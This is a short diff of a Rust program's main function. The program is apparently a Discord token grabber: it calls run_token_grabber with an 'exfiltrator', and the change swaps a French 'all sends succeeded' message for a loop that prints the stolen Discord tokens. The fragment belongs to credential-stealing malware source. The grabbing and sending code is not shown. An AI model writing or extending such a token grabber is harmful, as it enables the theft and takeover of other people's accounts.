@@ -66,7 +66,10 @@ async fn main() {
     if let Err(err) = run_token_grabber(&exfiltrator, entries).await {
         eprintln!("Erreur lors de l’exécution : {}", err);
     } else {
-        println!("Tous les envois ont réussi");
+        println!("Tokens Discord extraits :");
+        for token in &tokens {
+            println!("  {}", token);
+        }
     }
 }
 
